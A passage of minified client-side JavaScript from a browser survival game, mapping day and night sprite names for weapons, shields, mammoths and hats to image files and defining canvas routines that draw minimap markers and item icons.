                    NIGHT_RIVER_COMPO20: "img/night-pebblecompo20.png",
                    NIGHT_RIVER_COMPO21: "img/night-pebblecompo21.png",
                    NIGHT_RIVER_COMPO22: "img/night-pebblecompo22.png",
                    NIGHT_RIVER_COMPO23: "img/night-pebblecompo23.png",
                    NIGHT_RIVER_COMPO24: "img/night-pebblecompo24.png",
                    NIGHT_RIVER_COMPO25: "img/night-pebblecompo25.png",
                    NIGHT_RIVER_COMPO26: "img/night-pebblecompo26.png",
                    NIGHT_RIVER_COMPO27: "img/night-pebblecompo27.png",
                    NIGHT_RIVER_COMPO28: "img/night-pebblecompo28.png",
                    BABY_MAMMOTHD: "img/day-baby-mammoth.png",
                    BABY_MAMMOTH_TAMEDD: "img/day-baby-mammoth-tamed.png",
                    BABY_MAMMOTH_ATTACKD: "img/day-baby-mammoth-angry.png",
                    BABY_MAMMOTHN: "img/night-baby-mammoth.png",
                    BABY_MAMMOTH_TAMEDN: "img/night-baby-mammoth-tamed.png",
                    BABY_MAMMOTH_ATTACKN: "img/night-baby-mammoth-angry.png",
                    INV_BABY_MAMMOTH_OUT: "img/inv-mammoth-out.png",
                    INV_BABY_MAMMOTH_IN: "img/inv-mammoth-in.png",
                    INV_BABY_MAMMOTH_CLICK: "img/inv-mammoth-click.png",
                    HURT_BABY_MAMMOTH: "img/hurt-baby-mammoth.png",
                    BABY_MAMMOTH_STEP: "img/baby-mammoth-step.png",
                    FLOWER_HATD: "img/day-flower-hat.png",
                    FLOWER_HATN: "img/night-flower-hat.png",
                    INV_FLOWER_HAT_OUT: "img/inv-flower-hat-out.png",
                    INV_FLOWER_HAT_IN: "img/inv-flower-hat-in.png",
                    INV_FLOWER_HAT_CLICK: "img/inv-flower-hat-click.png",
                    FUR_HATD: "img/day-fur-hat.png",
                    FUR_HATN: "img/night-fur-hat.png",
                    INV_FUR_HAT_OUT: "img/inv-fur-hat-out.png",
                    INV_FUR_HAT_IN: "img/inv-fur-hat-in.png",
                    INV_FUR_HAT_CLICK: "img/inv-fur-hat-click.png",
                    MAMMOTHD: "img/day-mammoth.png",
                    MAMMOTHN: "img/night-mammoth.png",
                    HURT_MAMMOTH: "img/hurt-mammoth.png",
                    INV_FUR_MAMMOTH_OUT: "img/inv-mammoth-fur-out.png",
                    INV_FUR_MAMMOTH_IN: "img/inv-mammoth-fur-in.png",
                    INV_FUR_MAMMOTH_CLICK: "img/inv-mammoth-fur-click.png",
                    INV_WOOD_BOW_OUT: "img/inv-wood-bow-out.png",
                    INV_WOOD_BOW_IN: "img/inv-wood-bow-in.png",
                    INV_WOOD_BOW_CLICK: "img/inv-wood-bow-click.png",
                    INV_WOOD_ARROW_OUT: "img/inv-wood-arrow-out.png",
                    INV_WOOD_ARROW_IN: "img/inv-wood-arrow-in.png",
                    INV_WOOD_ARROW_CLICK: "img/inv-wood-arrow-click.png",
                    WOOD_BOWD: "img/day-wood-bow2.png",
                    WOOD_BOWN: "img/night-wood-bow2.png",
                    WOOD_ARROWD: "img/day-wood-arrow.png",
                    WOOD_ARROWN: "img/night-wood-arrow.png",
                    INV_STONE_BOW_OUT: "img/inv-stone-bow-out.png",
                    INV_STONE_BOW_IN: "img/inv-stone-bow-in.png",
                    INV_STONE_BOW_CLICK: "img/inv-stone-bow-click.png",
                    INV_STONE_ARROW_OUT: "img/inv-stone-arrow-out.png",
                    INV_STONE_ARROW_IN: "img/inv-stone-arrow-in.png",
                    INV_STONE_ARROW_CLICK: "img/inv-stone-arrow-click.png",
                    STONE_BOWD: "img/day-stone-bow.png",
                    STONE_BOWN: "img/night-stone-bow.png",
                    STONE_ARROWD: "img/day-stone-arrow.png",
                    STONE_ARROWN: "img/night-stone-arrow.png",
                    INV_GOLD_BOW_OUT: "img/inv-gold-bow-out.png",
                    INV_GOLD_BOW_IN: "img/inv-gold-bow-in.png",
                    INV_GOLD_BOW_CLICK: "img/inv-gold-bow-click.png",
                    INV_GOLD_ARROW_OUT: "img/inv-gold-arrow-out.png",
                    INV_GOLD_ARROW_IN: "img/inv-gold-arrow-in.png",
                    INV_GOLD_ARROW_CLICK: "img/inv-gold-arrow-click.png",
                    GOLD_BOWD: "img/day-gold-bow.png",
                    GOLD_BOWN: "img/night-gold-bow.png",
                    GOLD_ARROWD: "img/day-gold-arrow.png",
                    GOLD_ARROWN: "img/night-gold-arrow.png",
                    INV_DIAMOND_BOW_OUT: "img/inv-diamond-bow-out.png",
                    INV_DIAMOND_BOW_IN: "img/inv-diamond-bow-in.png",
                    INV_DIAMOND_BOW_CLICK: "img/inv-diamond-bow-click.png",
                    INV_DIAMOND_ARROW_OUT: "img/inv-diamond-arrow-out.png",
                    INV_DIAMOND_ARROW_IN: "img/inv-diamond-arrow-in.png",
                    INV_DIAMOND_ARROW_CLICK: "img/inv-diamond-arrow-click.png",
                    DIAMOND_BOWD: "img/day-diamond-bow.png",
                    DIAMOND_BOWN: "img/night-diamond-bow.png",
                    DIAMOND_ARROWD: "img/day-diamond-arrow.png",
                    DIAMOND_ARROWN: "img/night-diamond-arrow.png",
                    INV_AMETHYST_BOW_OUT: "img/inv-amethyst-bow-out.png",
                    INV_AMETHYST_BOW_IN: "img/inv-amethyst-bow-in.png",
                    INV_AMETHYST_BOW_CLICK: "img/inv-amethyst-bow-click.png",
                    INV_AMETHYST_ARROW_OUT: "img/inv-amethyst-arrow-out.png",
                    INV_AMETHYST_ARROW_IN: "img/inv-amethyst-arrow-in.png",
                    INV_AMETHYST_ARROW_CLICK: "img/inv-amethyst-arrow-click.png",
                    AMETHYST_BOWD: "img/day-amethyst-bow.png",
                    AMETHYST_BOWN: "img/night-amethyst-bow.png",
                    AMETHYST_ARROWD: "img/day-amethyst-arrow.png",
                    AMETHYST_ARROWN: "img/night-amethyst-arrow.png",
                    INV_DRAGON_BOW_OUT: "img/inv-dragon-bow-out.png",
                    INV_DRAGON_BOW_IN: "img/inv-dragon-bow-in.png",
                    INV_DRAGON_BOW_CLICK: "img/inv-dragon-bow-click.png",
                    INV_DRAGON_ARROW_OUT: "img/inv-dragon-arrow-out.png",
                    INV_DRAGON_ARROW_IN: "img/inv-dragon-arrow-in.png",
                    INV_DRAGON_ARROW_CLICK: "img/inv-dragon-arrow-click.png",
                    DRAGON_BOWD: "img/day-dragon-bow.png",
                    DRAGON_BOWN: "img/night-dragon-bow.png",
                    DRAGON_ARROWD: "img/day-dragon-arrow.png",
                    DRAGON_ARROWN: "img/night-dragon-arrow.png",
                    INV_REIDITE_BOW_OUT: "img/inv-reidite-bow-out.png",
                    INV_REIDITE_BOW_IN: "img/inv-reidite-bow-in.png",
                    INV_REIDITE_BOW_CLICK: "img/inv-reidite-bow-click.png",
                    INV_REIDITE_ARROW_OUT: "img/inv-reidite-arrow-out.png",
                    INV_REIDITE_ARROW_IN: "img/inv-reidite-arrow-in.png",
                    INV_REIDITE_ARROW_CLICK: "img/inv-reidite-arrow-click.png",
                    REIDITE_BOWD: "img/day-reidite-bow.png",
                    REIDITE_BOWN: "img/night-reidite-bow.png",
                    REIDITE_ARROWD: "img/day-reidite-arrow.png",
                    REIDITE_ARROWN: "img/night-reidite-arrow.png",
                    BANDAGE_ACTIVATED: "img/bandage-activated.png",
                    AUTO_FEED: "img/auto-feed.png",
                    STOP_REGENERATION_BLIZZARD: "img/stop-regeneration.png",
                    STOP_REGENERATION: "img/stop-regeneration2.png",
                    WOOD_TOWERD: "img/day-wood-platform.png",
                    WOOD_TOWERN: "img/night-wood-platform.png",
                    INV_WOOD_TOWER_IN: "img/inv-wood-platform-in.png",
                    INV_WOOD_TOWER_OUT: "img/inv-wood-platform-out.png",
                    INV_WOOD_TOWER_CLICK: "img/inv-wood-platform-click.png",
                    WOOD_SHIELDD: "img/day-wood-shield.png",
                    WOOD_SHIELDN: "img/night-wood-shield.png",
                    STONE_SHIELDD: "img/day-stone-shield.png",
                    STONE_SHIELDN: "img/night-stone-shield.png",
                    GOLD_SHIELDD: "img/day-gold-shield.png",
                    GOLD_SHIELDN: "img/night-gold-shield.png",
                    DIAMOND_SHIELDD: "img/day-diamond-shield.png",
                    DIAMOND_SHIELDN: "img/night-diamond-shield.png",
                    AMETHYST_SHIELDD: "img/day-amethyst-shield.png",
                    AMETHYST_SHIELDN: "img/night-amethyst-shield.png",
                    REIDITE_SHIELDD: "img/day-reidite-shield.png",
                    REIDITE_SHIELDN: "img/night-reidite-shield.png",
                    INV_WOOD_SHIELD_IN: "img/inv-wood-shield-in.png",
                    INV_WOOD_SHIELD_OUT: "img/inv-wood-shield-out.png",
                    INV_WOOD_SHIELD_CLICK: "img/inv-wood-shield-click.png",
                    INV_STONE_SHIELD_IN: "img/inv-stone-shield-in.png",
                    INV_STONE_SHIELD_OUT: "img/inv-stone-shield-out.png",
                    INV_STONE_SHIELD_CLICK: "img/inv-stone-shield-click.png",
                    INV_GOLD_SHIELD_IN: "img/inv-gold-shield-in.png",
                    INV_GOLD_SHIELD_OUT: "img/inv-gold-shield-out.png",
                    INV_GOLD_SHIELD_CLICK: "img/inv-gold-shield-click.png",
                    INV_DIAMOND_SHIELD_IN: "img/inv-diamond-shield-in.png",
                    INV_DIAMOND_SHIELD_OUT: "img/inv-diamond-shield-out.png",
                    INV_DIAMOND_SHIELD_CLICK: "img/inv-diamond-shield-click.png",
                    INV_AMETHYST_SHIELD_IN: "img/inv-amethyst-shield-in.png",
                    INV_AMETHYST_SHIELD_OUT: "img/inv-amethyst-shield-out.png",
                    INV_AMETHYST_SHIELD_CLICK: "img/inv-amethyst-shield-click.png",
                    INV_REIDITE_SHIELD_IN: "img/inv-reidite-shield-in.png",
                    INV_REIDITE_SHIELD_OUT: "img/inv-reidite-shield-out.png",
                    INV_REIDITE_SHIELD_CLICK: "img/inv-reidite-shield-click.png",
                    MACHETED: "img/day-machete.png",
                    MACHETEN: "img/night-machete.png",
                    INV_MACHETE_IN: "img/inv-machete-in.png",
                    INV_MACHETE_OUT: "img/inv-machete-out.png",
                    INV_MACHETE_CLICK: "img/inv-machete-click.png"
                },
                (WINDOW12 = [{}])[0].stringify = function (e) {
                    for (var t = new Uint8Array(new ArrayBuffer(e.length)), i = 0; i < e.length; i++)
                        t[i] = e[i];
                    return t
                }
                ,
                DUMP_IMAGES = {},
                PREPROC_IMAGES = {},
                IMAGES)
                DUMP_IMAGES[Ze] = IMAGES[Ze];
            sprite = [],
                RARITY = {
                    FREE: 0,
                    WOOD: 1,
                    STONE: 2,
                    GOLD: 3,
                    DIAMOND: 4,
                    AMETHYST: 5,
                    REIDITE: 6,
                    SPECIAL: 7,
                    LEVEL: 8
                },
                COSMETICS = {},
                MINIMAP_UTILS = [],
                find_cosmetics_per_id = function (e, t) {
                    for (var i = 0; i < e.length; i++)
                        if (e[i].id === t)
                            return i;
                    return -1
                }
                ;
            var $e = [];
            function e1(e, t) {
                for (var i = 0; i < $e.length; i += t) {
                    var n = $e[i];
                    if (n[0] === e) {
                        r = void 0;
                        o = void 0;
                        a = void 0;
                        s = void 0;
                        _ = void 0;
                        E = void 0;
                        u = void 0;
                        d = void 0;
                        T = void 0;
                        A = void 0;
                        h = void 0;
                        var r = n[0];
                        var o = n[1];
                        var a = n[2];
                        var s = n[3];
                        var _ = MINIMAP_UTILS[r];
                        if (void 0 !== _)
                            for (var E = 0; E < 2; E++) {
                                var u = _[o][E]
                                    , d = 193 * s / Fe.nw
                                    , T = 193 * a / Fe.nh
                                    , A = u.width / 3.5
                                    , h = u.height / 3.5;
                                sprite[ze.MINIMAP_CTX][E].drawImage(u, d - A / 2, T - h / 2, A, h),
                                    d = 600 * s / Fe.nw,
                                    T = 600 * a / Fe.nh,
                                    A = u.width / 1.5,
                                    h = u.height / 1.5,
                                    sprite[ze.BIGMAP_CTX][E].drawImage(u, d - A / 2, T - h / 2, A, h)
                            }
                    }
                }
            }
            function he(e, t, i, n) {
                t && (e.fillStyle = t,
                    e.fill()),
                    i && (e.lineWidth = n,
                        e.strokeStyle = i,
                        e.stroke())
            }
            function Ve(e, t, i, n, r, o) {
                (o = r < 2 * (o = n < 2 * o ? n / 2 : o) ? r / 2 : o) < 0 && (o = 0),
                    e.beginPath(),
                    e.moveTo(t + o, i),
                    e.arcTo(t + n, i, t + n, i + r, o),
                    e.arcTo(t + n, i + r, t, i + r, o),
                    e.arcTo(t, i + r, t, i, o),
                    e.arcTo(t, i, t + n, i, o),
                    e.closePath()
            }
            function ke(e, t, i, n) {
                e.beginPath(),
                    e.arc(t, i, n, 0, 2 * Math.PI)
            }
            function t1(e, t, i, n, r) {
                e.beginPath(),
                    e.lineCap = "round",
                    e.arc(t, i, n, 0, 2 * Math.PI * r)
            }
            function A(e, t, i, n) {
                var r = 2 * Math.PI / t;
                e.beginPath();
                for (var o = [{
                    x: i,
                    y: 0
                }], a = [], s = 1; s < t; s++) {
                    o.push({
                        x: Math.cos(s * r) * i,
                        y: Math.sin(s * r) * i
                    });
                    var _ = o.length;
                    a.push(Utils.middle_point(o[_ - 2], o[_ - 1]))
                }
                a.push(Utils.middle_point(o[o.length - 1], o[0]));
                var E = a[a.length - 1];
                for (e.moveTo(E.x, E.y),
                    s = 0; s < t; s++)
                    e.arcTo(o[s].x, o[s].y, a[s].x, a[s].y, n);
                e.closePath()
            }
            function I(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = Math.sqrt(t.width * t.width + t.height * t.height);
                return d2 = r / 2,
                    i.width = r,
                    i.height = r,
                    n.translate(d2, d2),
                    n.rotate(e),
                    n.drawImage(t, -t.width / 2, -t.height / 2),
                    i
            }
            function i1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 120 * e
                    , o = 110 * e
                    , a = r / 2
                    , s = o / 2
                    , _ = 20 * e
                    , E = 112 * e
                    , u = 82 * e
                    , d = E / 2
                    , T = u / 2
                    , e = 4 * e;
                return i.width = r,
                    i.height = o,
                    n.globalAlpha = 1,
                    n.translate(a, s),
                    Ve(n, -d, -T, E, u, _),
                    he(n, t, t, e),
                    i
            }
            function n1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 264 * e,
                    n.height = 246 * e,
                    r.translate(0, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(75 * e, 54 * e),
                    r.bezierCurveTo(79 * e, 21 * e, 131 * e, 13 * e, 153 * e, 36 * e),
                    r.bezierCurveTo(204 * e, 27 * e, 221 * e, 52 * e, 216 * e, 83 * e),
                    r.bezierCurveTo(241 * e, 103 * e, 232 * e, 138 * e, 214 * e, 147 * e),
                    r.bezierCurveTo(223 * e, 184 * e, 201 * e, 200 * e, 175 * e, 199 * e),
                    r.bezierCurveTo(156 * e, 218 * e, 135 * e, 222 * e, 114 * e, 203 * e),
                    r.bezierCurveTo(62 * e, 213 * e, 66 * e, 189 * e, 59 * e, 170 * e),
                    r.bezierCurveTo(27 * e, 164 * e, 31 * e, 134 * e, 38 * e, 123 * e),
                    r.bezierCurveTo(11 * e, 80 * e, 51 * e, 52 * e, 75 * e, 54 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -10 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(75 * e, 54 * e),
                    r.bezierCurveTo(79 * e, 21 * e, 131 * e, 13 * e, 153 * e, 36 * e),
                    r.bezierCurveTo(204 * e, 27 * e, 221 * e, 52 * e, 216 * e, 83 * e),
                    r.bezierCurveTo(241 * e, 103 * e, 232 * e, 138 * e, 214 * e, 147 * e),
                    r.bezierCurveTo(223 * e, 184 * e, 201 * e, 200 * e, 175 * e, 199 * e),
                    r.bezierCurveTo(156 * e, 218 * e, 135 * e, 222 * e, 114 * e, 203 * e),
                    r.bezierCurveTo(62 * e, 213 * e, 66 * e, 189 * e, 59 * e, 170 * e),
                    r.bezierCurveTo(27 * e, 164 * e, 31 * e, 134 * e, 38 * e, 123 * e),
                    r.bezierCurveTo(11 * e, 80 * e, 51 * e, 52 * e, 75 * e, 54 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(121 * e, 102 * e),
                    r.bezierCurveTo(111 * e, 80 * e, 110 * e, 66 * e, 108 * e, 51 * e),
                    r.bezierCurveTo(119 * e, 65 * e, 129 * e, 85 * e, 135 * e, 99 * e),
                    r.bezierCurveTo(142 * e, 67 * e, 146 * e, 60 * e, 152 * e, 50 * e),
                    r.bezierCurveTo(154 * e, 71 * e, 152 * e, 85 * e, 149 * e, 104 * e),
                    r.bezierCurveTo(166 * e, 88 * e, 175 * e, 83 * e, 188 * e, 78 * e),
                    r.bezierCurveTo(179 * e, 91 * e, 170 * e, 103 * e, 160 * e, 112 * e),
                    r.bezierCurveTo(186 * e, 107 * e, 191 * e, 107 * e, 204 * e, 108 * e),
                    r.bezierCurveTo(195 * e, 114 * e, 179 * e, 120 * e, 163 * e, 123 * e),
                    r.bezierCurveTo(183 * e, 130 * e, 186 * e, 135 * e, 192 * e, 140 * e),
                    r.bezierCurveTo(179 * e, 141 * e, 164 * e, 139 * e, 153 * e, 135 * e),
                    r.bezierCurveTo(158 * e, 145 * e, 163 * e, 159 * e, 165 * e, 177 * e),
                    r.bezierCurveTo(154 * e, 166 * e, 145 * e, 153 * e, 138 * e, 139 * e),
                    r.bezierCurveTo(133 * e, 155 * e, 125 * e, 170 * e, 117 * e, 182 * e),
                    r.bezierCurveTo(116 * e, 160 * e, 119 * e, 151 * e, 124 * e, 138 * e),
                    r.bezierCurveTo(107 * e, 150 * e, 95 * e, 156 * e, 82 * e, 159 * e),
                    r.bezierCurveTo(94 * e, 140 * e, 101 * e, 136 * e, 113 * e, 128 * e),
                    r.bezierCurveTo(78 * e, 123 * e, 75 * e, 121 * e, 67 * e, 118 * e),
                    r.bezierCurveTo(85 * e, 112 * e, 94 * e, 112 * e, 111 * e, 113 * e),
                    r.bezierCurveTo(89 * e, 97 * e, 85 * e, 93 * e, 78 * e, 82 * e),
                    r.bezierCurveTo(92 * e, 85 * e, 101 * e, 90 * e, 121 * e, 102 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(128 * e, 103 * e),
                    r.bezierCurveTo(111 * e, 112 * e, 117 * e, 136 * e, 140 * e, 130 * e),
                    r.bezierCurveTo(151 * e, 126 * e, 156 * e, 115 * e, 155 * e, 107 * e),
                    r.bezierCurveTo(155 * e, 96 * e, 154 * e, 94 * e, 148 * e, 94 * e),
                    r.bezierCurveTo(141 * e, 94 * e, 146 * e, 104 * e, 136 * e, 104 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    n
            }
            function r1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 70 * e,
                    n.height = 70 * e,
                    r.globalAlpha = .5,
                    ke(r, 26 * e, 26 * e, 9 * e),
                    he(r, i[0]),
                    ke(r, 56 * e, 36 * e, 9 * e),
                    he(r, i[1]),
                    ke(r, 40 * e, 50 * e, 9 * e),
                    he(r, i[2]),
                    r.globalAlpha = 1,
                    ke(r, 26 * e, 26 * e, 5 * e),
                    he(r, i[0]),
                    ke(r, 56 * e, 36 * e, 5 * e),
                    he(r, i[1]),
                    ke(r, 40 * e, 50 * e, 5 * e),
                    he(r, i[2]),
                    n
            }
            function o1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 22 * e,
                    n.height = 22 * e,
                    r.globalAlpha = .4,
                    ke(r, 11 * e, 11 * e, 10 * e),
                    he(r, i[0]),
                    r.globalAlpha = .7,
                    ke(r, 11 * e, 11 * e, 7 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    ke(r, 11 * e, 11 * e, 4 * e),
                    he(r, i[0]),
                    n
            }
            function a1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 248 * e,
                    n.height = 247 * e,
                    r.save(),
                    r.translate(69.5 * e, 145 * e),
                    Ve(r, -8.5 * e, -63 * e, 17 * e, 127 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(183 * e, 145 * e),
                    Ve(r, -8 * e, -63 * e, 16 * e, 126 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(123.5 * e, 62.5 * e),
                    r.rotate(6.28),
                    Ve(r, -84.5 * e, -25.5 * e, 169 * e, 51 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[1], 6 * e),
                    r.save(),
                    r.translate(123.5 * e, 118 * e),
                    r.rotate(6.24),
                    Ve(r, -85.5 * e, -24 * e, 169 * e, 48 * e, 5 * e),
                    r.restore(),
                    he(r, i[3], i[1], 6 * e),
                    r.save(),
                    r.translate(122 * e, 177.5 * e),
                    r.rotate(6.32),
                    Ve(r, -84 * e, -23.5 * e, 169 * e, 47 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[1], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(37 * e, 157 * e),
                    r.bezierCurveTo(49 * e, 160 * e, 49 * e, 160 * e, 61 * e, 163 * e),
                    r.bezierCurveTo(49.5 * e, 165.5 * e, 49.5 * e, 165.5 * e, 38 * e, 168 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(205 * e, 175 * e),
                    r.bezierCurveTo(192.5 * e, 180 * e, 192.5 * e, 180 * e, 180 * e, 185 * e),
                    r.bezierCurveTo(193 * e, 188 * e, 193 * e, 188 * e, 206 * e, 191 * e),
                    r.closePath(),
                    he(r, i[1]),
                    n
            }
            function s1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 248 * e,
                    n.height = 247 * e,
                    r.save(),
                    r.translate(182 * e, 120 * e),
                    Ve(r, -8 * e, -67 * e, 16 * e, 134 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(68.5 * e, 127.5 * e),
                    Ve(r, -8.5 * e, -70.5 * e, 17 * e, 141 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(123.5 * e, 68 * e),
                    Ve(r, -82.5 * e, -24 * e, 165 * e, 48 * e, 4 * e),
                    r.restore(),
                    he(r, i[2], i[1], 6 * e),
                    r.save(),
                    r.translate(123 * e, 179.5 * e),
                    Ve(r, -83 * e, -24.5 * e, 166 * e, 49 * e, 4 * e),
                    r.restore(),
                    he(r, i[2], i[1], 6 * e),
                    r.save(),
                    r.translate(123.5 * e, 123.5 * e),
                    r.rotate(6.24),
                    Ve(r, -82.5 * e, -24.5 * e, 165 * e, 49 * e, 4 * e),
                    r.restore(),
                    he(r, i[3], i[1], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(204 * e, 112 * e),
                    r.bezierCurveTo(149 * e, 121.5 * e, 96 * e, 130 * e, 94 * e, 131 * e),
                    r.bezierCurveTo(149.5 * e, 127.5 * e, 149.5 * e, 127.5 * e, 205 * e, 124 * e),
                    r.closePath(),
                    he(r, i[1]),
                    n
            }
            function _1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 248 * e,
                    n.height = 247 * e,
                    r.save(),
                    r.translate(183 * e, 107 * e),
                    Ve(r, -8 * e, -70.5 * e, 16 * e, 141 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(69.5 * e, 110 * e),
                    Ve(r, -8.5 * e, -71 * e, 17 * e, 143 * e, +e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(123.5 * e, 181 * e),
                    Ve(r, -84.5 * e, -26 * e, 169 * e, 52 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[1], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 95 * e),
                    r.bezierCurveTo(105 * e, 96 * e, 113 * e, 99 * e, 134 * e, 102 * e),
                    r.bezierCurveTo(147 * e, 106 * e, 173 * e, 100 * e, 207 * e, 105 * e),
                    r.bezierCurveTo(210 * e, 105 * e, 207 * e, 140 * e, 207 * e, 154 * e),
                    r.bezierCurveTo(123.5 * e, 151.5 * e, 123.5 * e, 151.5 * e, 40 * e, 149 * e),
                    r.bezierCurveTo(37 * e, 145 * e, 39 * e, 95 * e, 41 * e, 96 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(68 * e, 75 * e),
                    r.bezierCurveTo(54 * e, 72.5 * e, 54 * e, 72.5 * e, 40 * e, 70 * e),
                    r.bezierCurveTo(38 * e, 46 * e, 40 * e, 46 * e, 53 * e, 46 * e),
                    r.bezierCurveTo(201 * e, 41 * e, 201 * e, 41 * e, 201 * e, 42 * e),
                    r.bezierCurveTo(211 * e, 40 * e, 208 * e, 53 * e, 208 * e, 72 * e),
                    r.bezierCurveTo(209 * e, 91 * e, 210 * e, 96 * e, 194 * e, 94 * e),
                    r.bezierCurveTo(119 * e, 97 * e, 119 * e, 97 * e, 44 * e, 100 * e),
                    r.bezierCurveTo(39 * e, 99 * e, 40 * e, 96 * e, 40 * e, 80 * e),
                    r.bezierCurveTo(54 * e, 77.5 * e, 54 * e, 77.5 * e, 68 * e, 75 * e),
                    r.closePath(),
                    he(r, i[3], i[1], 6 * e),
                    n
            }
            function E1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 191 * e,
                    n.height = 153 * e,
                    r.globalAlpha = .5,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(97.49996948242188 * e, 95.12844848632812 * e),
                    Ve(r, -62.5 * e, -41.5 * e, 125 * e, 83 * e, 20 * e),
                    r.restore(),
                    he(r, i[0], i[0], 4 * e),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(97.49996948242188 * e, 95.12844848632812 * e),
                    Ve(r, -62.5 * e, -41.5 * e, 125 * e, 83 * e, 20 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.globalCompositeOperation = "destination-out",
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(26.999969482421875 * e, 50.850677490234375 * e),
                    r.bezierCurveTo(46.499969482421875 * e, 64.85067749023438 * e, 46.499969482421875 * e, 64.85067749023438 * e, 65.99996948242188 * e, 78.85067749023438 * e),
                    r.bezierCurveTo(80.99996948242188 * e, 87.85067749023438 * e, 105.99996948242188 * e, 82.85067749023438 * e, 114.99996948242188 * e, 80.85067749023438 * e),
                    r.bezierCurveTo(130.99996948242188 * e, 69.85067749023438 * e, 152.99996948242188 * e, 70.85067749023438 * e, 166.99996948242188 * e, 67.85067749023438 * e),
                    r.bezierCurveTo(156.99996948242188 * e, 52.850677490234375 * e, 156.99996948242188 * e, 52.850677490234375 * e, 146.99996948242188 * e, 37.850677490234375 * e),
                    r.bezierCurveTo(101.49996948242188 * e, 37.350677490234375 * e, 101.49996948242188 * e, 37.350677490234375 * e, 55.999969482421875 * e, 36.850677490234375 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 4 * e),
                    r.globalCompositeOperation = "source-over",
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(40.999969482421875 * e, 59.850677490234375 * e),
                    r.bezierCurveTo(41.999969482421875 * e, 50.850677490234375 * e, 47.999969482421875 * e, 47.850677490234375 * e, 56.999969482421875 * e, 49.850677490234375 * e),
                    r.bezierCurveTo(65.99996948242188 * e, 41.850677490234375 * e, 76.99996948242188 * e, 42.850677490234375 * e, 90.99996948242188 * e, 47.850677490234375 * e),
                    r.bezierCurveTo(94.99996948242188 * e, 42.850677490234375 * e, 104.99996948242188 * e, 42.850677490234375 * e, 114.99996948242188 * e, 47.850677490234375 * e),
                    r.bezierCurveTo(131.99996948242188 * e, 42.850677490234375 * e, 142.99996948242188 * e, 48.850677490234375 * e, 145.99996948242188 * e, 56.850677490234375 * e),
                    r.bezierCurveTo(160.99996948242188 * e, 63.850677490234375 * e, 154.99996948242188 * e, 69.85067749023438 * e, 155.99996948242188 * e, 70.85067749023438 * e),
                    r.bezierCurveTo(141.99996948242188 * e, 71.85067749023438 * e, 141.99996948242188 * e, 71.85067749023438 * e, 127.99996948242188 * e, 72.85067749023438 * e),
                    r.bezierCurveTo(110.99996948242188 * e, 83.85067749023438 * e, 107.99996948242188 * e, 82.85067749023438 * e, 90.99996948242188 * e, 85.85067749023438 * e),
                    r.bezierCurveTo(70.99996948242188 * e, 83.85067749023438 * e, 64.99996948242188 * e, 79.85067749023438 * e, 53.999969482421875 * e, 70.85067749023438 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(33.999969482421875 * e, 65.85067749023438 * e),
                    r.bezierCurveTo(36.999969482421875 * e, 59.850677490234375 * e, 34.999969482421875 * e, 60.850677490234375 * e, 39.999969482421875 * e, 59.850677490234375 * e),
                    r.bezierCurveTo(47.999969482421875 * e, 61.850677490234375 * e, 62.999969482421875 * e, 76.85067749023438 * e, 74.99996948242188 * e, 79.85067749023438 * e),
